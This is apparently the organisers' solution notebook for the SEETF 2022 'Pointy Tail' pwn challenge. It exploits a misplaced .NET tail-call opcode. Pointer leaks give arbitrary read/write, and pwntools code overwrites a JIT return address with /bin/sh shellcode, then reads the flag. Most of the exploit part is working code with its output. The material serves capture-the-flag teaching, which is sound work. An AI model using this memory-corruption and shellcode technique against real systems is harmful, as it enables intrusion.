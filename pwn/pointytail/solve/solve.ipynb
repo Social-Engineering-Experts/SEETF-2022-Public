{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Solution for Pointy Tail\n",
    "\n",
    "_This challenge was inspired by a bug seen in the actual F# compiler (fsc.exe) sometime between .NET 5.0 and .NET 6.0 (and subsequently fixed), where it can emit a tail opcode incorrectly. So this challenge is the result of wondering \"how much damage could a single .tail opcode do?\"._"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "from pwn import *\n",
    "import ast, struct"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[x] Opening connection to fun.chall.seetf.sg on port 50007\n",
      "[x] Opening connection to fun.chall.seetf.sg on port 50007: Trying 34.131.197.225\n",
      "[+] Opening connection to fun.chall.seetf.sg on port 50007: Done\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "b'Which is better, a struct or a class? Why not both!'"
      ]
     },
     "execution_count": 2,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sh = remote('fun.chall.seetf.sg', 50007)\n",
    "sh.recvline(False)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "First things first, we need to figure out where the exploit is. It turns out that `Main()` sneakily calls `Main2()` via a tail call, i.e.\n",
    "```\n",
    "IL_002e: tail.\n",
    "IL_0030: call void Challenge::Main2(valuetype Challenge/PointStruct&)\n",
    "IL_0035: ret\n",
    "```\n",
    "\n",
    "This is a legal MSIL opcode that does not get emitted by C#, but can be emitted by F# (and in fact, this bug was seen in actual F# code). This produces assembly code where `Main2()` gets called via a [tail call](https://en.wikipedia.org/wiki/Tail_call), i.e. it `JMP`s to `Main2` and reuses the stack frame rather than starting a new frame.\n",
    "\n",
    "This is where the fun happens. Since our `struct s` is created on the stack and passed via `ref`, reusing the stack frame effectively means that it can get overwritten. And indeed, `Main2()` just so happens to overwrite it nicely with the `class c` pointer, and the backreference to itself (via the input argument). To see what this all means, first we define a few useful functions."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "# sends the empty string, so that we get back the PointStruct and the PointClass values\n",
    "def getvals():\n",
    "    sh.sendline()\n",
    "    return [ast.literal_eval(sh.recvline(False).decode()[4:]) for _ in range(2)]\n",
    "\n",
    "# functions to convert between 64-bit floats to 64-bit ints\n",
    "def ftoi(n):\n",
    "    return struct.unpack('q',struct.pack('d',n))[0]\n",
    "def itof(n):\n",
    "    return struct.unpack('d',struct.pack('q',n))[0]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "((6.90971895553006e-310, 6.95260779519737e-310),\n",
       " (0.21680875804578414, 0.07878193302692826))"
      ]
     },
     "execution_count": 4,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "s0,c0=getvals()\n",
    "s0,c0"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "On a normal un-tailed call, we would expect all four values to be randomly picked between 0 and 1, but what we're seeing here is that the first two are ridiculously small. This is because they are pointers rather than actual floats. We can see what they really represent:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['0x7f325c008b90', '0x7ffc7996c870']"
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "[hex(ftoi(n)) for n in s0]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Either by trial and error or by inspecting the output assembly, we find that the first value is a pointer that points to the `PointClass` (which itself is an 8-bit Method Table followed by the `x` and `y` values), and the second value points to itself. This means that:\n",
    "1. The ability to write to the first value means we have arbitrary read/write access.\n",
    "2. Knowing the second value means we know where the stack is, and thus have a return address.\n",
    "\n",
    "So now the challenge reduces to a regular pwn challenge, and we can use standard ROP methods or similar. We will exploit the fact the the JIT places the return address in a RWX page, so we simply overwrite this with some shellcode and we are done."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "48"
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "shellcode = asm(shellcraft.amd64.linux.sh(), arch='amd64')\n",
    "len(shellcode)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The default shellcode provided by shellcraft gives us a 48-byte exploit, which we can fit into six 8-bit floats. So the plan is to leak the return address, and fill in these bytes. First, let's see what the address is."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'0x7f330d8b6a17'"
      ]
     },
     "execution_count": 7,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "s_addr = ftoi(s0[1])\n",
    "sh.sendline(f's {itof(s_addr + 16)} 0'.encode())\n",
    "retn_addr = ftoi(getvals()[1][0])\n",
    "hex(retn_addr)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Ok, we're ready to do some writing. Since the `class c` pointer actually points the Method Table, with the `x` and `y` following it, we need to set it to point to 8 bytes before wherever we want to write our bytes. Finally, we exit the loop by throwing an exception (e.g. sending it just `s` causes an array index out of bounds exception) and sleep for a bit to make sure we're inside a shell."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [],
   "source": [
    "fs = struct.unpack('dddddd', shellcode)\n",
    "for i in range(3):\n",
    "    sh.sendline(f's {itof(retn_addr-8+16*i)} 0'.encode())\n",
    "    sh.sendline(f'c {fs[2*i]} {fs[2*i+1]}'.encode())\n",
    "\n",
    "sh.sendline(b's')\n",
    "sleep(1)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b'SEE{fsharp_can_emit_tail_opcode_3eb8f64b9e9569c7}'\n"
     ]
    }
   ],
   "source": [
    "sh.sendline(b'cat flag.txt')\n",
    "print(sh.recvline(False))"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
